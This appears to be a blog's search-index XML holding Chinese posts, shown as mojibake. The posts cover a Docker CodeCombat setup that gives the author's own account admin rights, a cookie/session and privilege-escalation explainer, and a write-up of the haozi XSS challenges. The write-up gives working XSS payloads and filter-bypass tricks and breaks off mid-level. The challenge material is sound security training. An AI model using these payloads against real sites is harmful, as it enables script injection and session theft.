<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Docker æ­å»º codecombat æœ¬åœ°æœåŠ¡</title>
    <link href="/2023/03/20/2023-03-20.codecombat%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/03/20/2023-03-20.codecombat%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="1-åˆ›å»ºå®¹å™¨"><a href="#1-åˆ›å»ºå®¹å™¨" class="headerlink" title="1 åˆ›å»ºå®¹å™¨"></a>1 åˆ›å»ºå®¹å™¨</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‹‰å–codecombaté•œåƒ</span><br>docker pull operepo/ope-codecombat<br><br><span class="hljs-comment"># åˆ›å»º container</span><br>docker run -itd --name mycoco -p 0.0.0.0:3020:3000 operepo/ope-codecombat /bin/bash<br><br></code></pre></td></tr></table></figure><p>ä¸‹è½½æ•°æ®åŒ…ï¼š<a href="https://github.com/mingyue0094/the_the_tes/releases/download/v1.1/dump.tar.gz">dump.tar.gz</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŠŠæ•°æ®åŒ…dump.tar.gzå¤åˆ¶åˆ°å®¹å™¨å†…</span><br>docker <span class="hljs-built_in">cp</span> dump.tar.gz mycoco:/home/coco/codecombat/data/<br><br><span class="hljs-comment"># è¿›å…¥å®¹å™¨</span><br>docker <span class="hljs-built_in">exec</span> -it mycoco /bin/bash<br><br><span class="hljs-comment"># è¿›å…¥æ”¾æ•°æ®çš„dataç›®å½•</span><br><span class="hljs-built_in">cd</span> /home/coco/codecombat/data/<br><br><span class="hljs-comment"># è§£å‹</span><br>tar -zxvf dump.tar.gz<br></code></pre></td></tr></table></figure><h1 id="2-é…ç½®-container-å¯åŠ¨æœåŠ¡"><a href="#2-é…ç½®-container-å¯åŠ¨æœåŠ¡" class="headerlink" title="2 é…ç½® container å¯åŠ¨æœåŠ¡"></a>2 é…ç½® container å¯åŠ¨æœåŠ¡</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¿›å…¥å®¹å™¨</span><br>docker <span class="hljs-built_in">exec</span> -it mycoco /bin/bash<br><br><span class="hljs-comment"># æœåŠ¡è‡ªå¯åŠ¨ï¼Œå°†ä»¥ä¸‹ä¸‹å†…å®¹åŠ å…¥ /root/.bashrc æ–‡ä»¶æœ«å°¾</span><br><br><span class="hljs-keyword">if</span> [ -f /root/.bashrc ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">cd</span> /home/coco/codecombat/ &amp;&amp; <span class="hljs-built_in">nohup</span> ./bin/coco-mongodb &gt; mycoco-mongodb.log 2&gt;&amp;1 &amp;<br>    <span class="hljs-built_in">cd</span> /home/coco &amp;&amp; <span class="hljs-built_in">nohup</span> sh start.sh &gt; mystart.log 2&gt;&amp;1 &amp;<br><span class="hljs-keyword">fi</span><br><br></code></pre></td></tr></table></figure><h1 id="3-è¶…çº§ç®¡ç†å‘˜æ¨¡å¼"><a href="#3-è¶…çº§ç®¡ç†å‘˜æ¨¡å¼" class="headerlink" title="3 è¶…çº§ç®¡ç†å‘˜æ¨¡å¼"></a>3 è¶…çº§ç®¡ç†å‘˜æ¨¡å¼</h1><p>æ‰“å¼€ <a href="http://127.0.0.1:3020/">http://127.0.0.1:3020</a> æˆ–è‡ªå·±ç”µè„‘çš„ http:&#x2F;&#x2F;[ip]:3020 ï¼Œç‚¹å‡»ã€æ³¨å†Œã€‘ï¼Œè¦é€‰æ‹©ã€ç‹¬ç«‹è´¦å·ã€‘ã€‚</p><p>ç”¨ä¸ªè‡ªå·±çš„é‚®ç®±å’Œè´¦å·ï¼ˆè‹±æ–‡å°±è¡Œï¼‰ï¼Œæ¯”å¦‚æˆ‘çš„è´¦å·åä¸ºï¼šmm</p><blockquote><p>Tipsï¼šå‡ºç”Ÿæ—¥æœŸå¾€å‰é¢é€‰ä¸€ç‚¹ï¼Œé€‰æ‹©1990å¹´ä¹‹å‰ï¼Œå¦åˆ™åˆ¤å®šä¸æ˜¯å®¶é•¿ï¼Œå°±æ— æ³•æ³¨å†Œã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¿›å…¥å®¹å™¨</span><br>docker <span class="hljs-built_in">exec</span> -it mycoco /bin/bash<br><span class="hljs-comment"># æ‰“å¼€æ•°æ®åº“</span><br>mongo<br><span class="hljs-comment"># ä½¿ç”¨cocooæ•°æ®åº“</span><br>use coco<br><span class="hljs-comment"># å°† mm è´¦å·å‡çº§ä¸ºâ€œè¶…çº§ç®¡ç†å‘˜æ¨¡å¼â€ï¼Œè¿™é‡Œ mm ä¸ºä½ è‡ªå·±æ³¨å†Œæ—¶å€™ç”¨çš„åå­—</span><br>db.users.update(&#123;<span class="hljs-string">&#x27;name&#x27;</span>:<span class="hljs-string">&#x27;mm&#x27;</span>&#125;,&#123;<span class="hljs-variable">$set</span>:&#123;<span class="hljs-string">&#x27;earned.gems&#x27;</span>:9999999,permissions:[<span class="hljs-string">&quot;godmode&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>]&#125;&#125;,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>);<br><br></code></pre></td></tr></table></figure><blockquote><p>Tip:åˆ·æ–°é¡µé¢ã€‚</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Coding</category>
      
      <category>game</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Coding</tag>
      
      <tag>game</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¶Šæƒã€cookieå’Œsession</title>
    <link href="/2022/08/24/2022-08-24.%E8%B6%8A%E6%9D%83_cookie_session/"/>
    <url>/2022/08/24/2022-08-24.%E8%B6%8A%E6%9D%83_cookie_session/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#1-cookie-%E5%92%8C-session-%E7%9A%84%E4%BD%9C%E7%94%A8">1 cookie å’Œ session çš„ä½œç”¨</a><ul><li><a href="#11-cookie">1.1 cookie</a></li><li><a href="#12-session">1.2 session</a></li></ul></li><li><a href="#2-%E8%B6%8A%E6%9D%83%E4%B8%8E-session_id-%E7%9A%84%E6%A0%A1%E9%AA%8C">2 è¶Šæƒä¸ session_id çš„æ ¡éªŒ</a><ul><li><a href="#21-%E8%B6%8A%E6%9D%83%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8E%9F%E5%9B%A0">2.1 è¶Šæƒå­˜åœ¨çš„åŸå› </a></li><li><a href="#22-%E8%B6%8A%E6%9D%83%E5%AD%98%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE">2.2 è¶Šæƒå­˜åœ¨çš„ä½ç½®</a></li></ul></li></ul><h1 id="1-cookie-å’Œ-session-çš„ä½œç”¨"><a href="#1-cookie-å’Œ-session-çš„ä½œç”¨" class="headerlink" title="1 cookie å’Œ session çš„ä½œç”¨"></a>1 cookie å’Œ session çš„ä½œç”¨</h1><h2 id="1-1-cookie"><a href="#1-1-cookie" class="headerlink" title="1.1 cookie"></a>1.1 cookie</h2><ul><li>cookie å­˜æ”¾åœ¨å®¢æˆ·ç«¯ï¼Œæ˜¯å®¢æˆ·ç«¯ä¿æŒçŠ¶æ€çš„æ–¹æ¡ˆã€‚</li></ul><ol><li>æŒä¹… cookie: ç½‘æ˜“é‚®ç®±ç™»å½•çš„æ—¶å€™ä¼šæç¤ºä¿æŒç™»å½•æ—¶é—´7å¤©ï¼Œå°±ä¼šè®¾ç½®session_idçš„ç”Ÿå­˜æ—¶é—´ä¸º7å¤©ï¼Œå¹¶ä¿å­˜åœ¨æœ¬åœ°ç¡¬ç›˜ä¸Šã€‚</li><li>ä¼šè¯ cookie: ä¸è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œåœ¨æµè§ˆå™¨å…³é—­å cookie session å¤±æ•ˆ</li></ol><ul><li>cookie çš„ä¸»è¦ä½œç”¨ä¹‹ä¸€æ˜¯è®°å½• session_id </li><li>ä¸ç®¡ç”¨æˆ·ç™»å½•æˆ–è€…ä¸ç™»å½•æœåŠ¡å™¨éƒ½ä¼šå‘é€ cookie ç»™å®¢æˆ·ç«¯</li></ul><h2 id="1-2-session"><a href="#1-2-session" class="headerlink" title="1.2 session"></a>1.2 session</h2><ul><li>session å­˜æ”¾åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ˜¯æœåŠ¡å™¨ç«¯ä¿æŒçŠ¶æ€çš„æ–¹æ¡ˆ</li><li>åœ¨æœåŠ¡å™¨ç«¯ä¿æŒçŠ¶æ€çš„æ–¹æ¡ˆåœ¨å®¢æˆ·ç«¯ä¹Ÿéœ€è¦ä¿å­˜ä¸€ä¸ªæ ‡è¯†ï¼Œæ‰€ä»¥ session æœºåˆ¶éœ€è¦å€ŸåŠ©äº cookie æœºåˆ¶æ¥è¾¾åˆ°ä¿å­˜æ ‡è¯†çš„ç›®çš„</li><li>session çš„å¤±æ•ˆæ—¶é—´ï¼š</li></ul><ol><li>ç¨‹åºè°ƒç”¨HttpSession.invalidate()</li><li>è·ç¦»ä¸Šä¸€æ¬¡æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„session idæ—¶é—´é—´éš”è¶…è¿‡äº†sessionçš„æœ€å¤§æœ‰æ•ˆæ—¶é—´</li><li>æœåŠ¡å™¨è¿›ç¨‹è¢«åœæ­¢<blockquote><p>Tips: å…³é—­æµè§ˆå™¨åªä¼šä½¿å­˜å‚¨åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨å†…å­˜ä¸­çš„ cookie session å¤±æ•ˆï¼Œä¸ä¼šä½¿æœåŠ¡å™¨ç«¯çš„ session å¯¹è±¡å¤±æ•ˆã€‚</p></blockquote></li></ol><h1 id="2-è¶Šæƒä¸-session-id-çš„æ ¡éªŒ"><a href="#2-è¶Šæƒä¸-session-id-çš„æ ¡éªŒ" class="headerlink" title="2 è¶Šæƒä¸ session_id çš„æ ¡éªŒ"></a>2 è¶Šæƒä¸ session_id çš„æ ¡éªŒ</h1><h2 id="2-1-è¶Šæƒå­˜åœ¨çš„åŸå› "><a href="#2-1-è¶Šæƒå­˜åœ¨çš„åŸå› " class="headerlink" title="2.1 è¶Šæƒå­˜åœ¨çš„åŸå› "></a>2.1 è¶Šæƒå­˜åœ¨çš„åŸå› </h2><ul><li>åœ¨è¿›è¡Œæ–¹æ³•è°ƒç”¨çš„æ—¶å€™ï¼Œæœªè¿›è¡Œè¯·æ±‚ç”¨æˆ· cookie ä¸­çš„ session_id å’Œç›®æ ‡ä¿¡æ¯æ‹¥æœ‰è€… session_id æ˜¯å¦åŒ¹é…ä¸€è‡´ï¼Œç›´æ¥ç”¨ç”¨æˆ· id æˆ–è€…å…¶ä»– id è¿›è¡Œäº†åŒ¹é…</li></ul><h2 id="2-2-è¶Šæƒå­˜åœ¨çš„ä½ç½®"><a href="#2-2-è¶Šæƒå­˜åœ¨çš„ä½ç½®" class="headerlink" title="2.2 è¶Šæƒå­˜åœ¨çš„ä½ç½®"></a>2.2 è¶Šæƒå­˜åœ¨çš„ä½ç½®</h2><ul><li>æ°´å¹³è¶Šæƒï¼šç™»å½•æ³¨å†Œã€å¯†ç æ‰¾å›ã€ä¿¡æ¯æŸ¥çœ‹ã€äº¤æ˜“æ”¯ä»˜</li><li>å‚ç›´è¶Šæƒï¼šé«˜ä½æƒé™è´¦å·æƒé™ä¸åŒçš„æ‰€æœ‰ä½ç½®</li></ul><p>å‚è€ƒå†…å®¹ï¼š</p><p><a href="https://developer.aliyun.com/article/684252">cookieä¸sessionä½œç”¨ã€åŒºåˆ«ã€åº”ç”¨èŒƒå›´ã€sessionçš„å·¥ä½œåŸç†</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>è¶Šæƒ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>è¶Šæƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è€—å­XSS</title>
    <link href="/2022/08/11/2022-08-11.%E8%80%97%E5%AD%90XSS/"/>
    <url>/2022/08/11/2022-08-11.%E8%80%97%E5%AD%90XSS/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#0x00">0x00</a></li><li><a href="#0x01">0x01</a></li><li><a href="#0x02">0x02</a></li><li><a href="#0x03">0x03</a></li><li><a href="#0x04">0x04</a></li><li><a href="#0x05">0x05</a></li><li><a href="#0x06">0x06</a></li><li><a href="#0x07">0x07</a></li><li><a href="#0x08">0x08</a></li><li><a href="#0x09">0x09</a></li><li><a href="#0x0a">0x0A</a></li><li><a href="#0x0b">0x0B</a></li><li><a href="#0x0c">0x0C</a></li><li><a href="#0x0d">0x0D</a></li><li><a href="#0x0e">0x0E</a></li><li><a href="#0x0f">0x0F</a></li><li><a href="#0x10">0x10</a></li><li><a href="#0x11">0x11</a></li><li><a href="#0x12">0x12</a></li></ul><p><a href="https://xss.haozi.me/">è€—å­XSS</a></p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ul><li>server æºç </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E<br></code></pre></td></tr></table></figure><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><ul><li>server æºç </li></ul><p>è¾“å…¥å‚æ•°è¢«æ”¾åœ¨æ–‡æœ¬æ ‡ç­¾é‡Œï¼Œæ–‡æœ¬æ ‡ç­¾å‰åé—­åˆå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/textarea&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3C%2Ftextarea%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Ctextarea%3E<br></code></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><ul><li>server æºç </li></ul><p>å‚æ•°ä½œä¸º <code>&lt;input&gt;</code> æ ‡ç­¾çš„ value å›æ˜¾åˆ°å‰ç«¯ï¼Œå¯ä»¥é—­åˆ value åŠ ä¸Šonclickäº‹ä»¶ï¼Œæˆ–è€…é—­åˆ <code>&lt;input&gt;</code> æ·»åŠ  alert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>&quot; onclick=alert(1) &quot;<br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;&gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span> &quot;&quot;&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=&#x27;%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E<br><br>http://xss.test/?input=%22%20onclick%3Dalert(1)%20%22<br></code></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><ul><li>server æºç </li></ul><p>è¿‡æ»¤æ‹¬å· <code>[()]</code>ï¼Œå¯ä»¥ä½¿ç”¨åå¼•å·ä»£æ›¿ï¼Œhtmlç¼–ç ç»•è¿‡ï¼Œæˆ–è€…å¼•ç”¨å¤–éƒ¨jsæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripBracketsRe</span> = /[()]/g<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"># åå¼•å·<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><br># htmlç¼–ç ç»•è¿‡<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"># åå¼•å·<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br># htmlç¼–ç ç»•è¿‡<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs url"># åå¼•å·<br>http://xss.test/?input=%3Cscript%3Ealert%601%60%3C%2Fscript%3E%20<br><br># htmlç¼–ç ç»•è¿‡<br>http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E<br><br></code></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><ul><li>server æºç </li></ul><p>åå¼•å·ä¹Ÿè¢«è¿‡æ»¤ï¼Œhtmlç¼–ç ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">stripBracketsRe</span> = /[()`]/g<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E%20<br></code></pre></td></tr></table></figure><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><ul><li>server æºç </li></ul><p>è¿‡æ»¤ â€“&gt; é˜²æ­¢æ ‡ç­¾é—­åˆï¼Œâ€“!&gt; åŒæ ·å¯ä»¥é—­åˆæ ‡ç­¾</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/--&gt;/g, <span class="hljs-string">&#x27;ğŸ˜‚&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">--!&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#x28;1&amp;#x29;</span>&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- --!&gt;&lt;img src=# onerror=alert&amp;#x28;1&amp;#x29;&gt;  --&gt;</span><br></code></pre></td></tr></table></figure><ul><li>URL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://xss.test/?input=--!%3E%3Cimg%20src%3D%23%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E%20<br></code></pre></td></tr></table></figure><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><ul><li>server æºç </li></ul><p>è¿‡æ»¤ auto|on.*&#x3D;|&gt; ï¼Œä½¿ç”¨æ¢è¡Œç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.<span class="hljs-title function_ invoke__">replace</span>(/auto|on.*=|&gt;/ig, <span class="hljs-string">&#x27;_&#x27;</span>)<br>  <span class="hljs-keyword">return</span> `&lt;input value=<span class="hljs-number">1</span> $&#123;input&#125; type=<span class="hljs-string">&quot;text&quot;</span>&gt;`<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ’å…¥ä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">type=&quot;image&quot; src=# onerror<br>=alert(1)<br></code></pre></td></tr></table></figure><ul><li>ç½‘é¡µä»£ç </li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">src</span>=<span 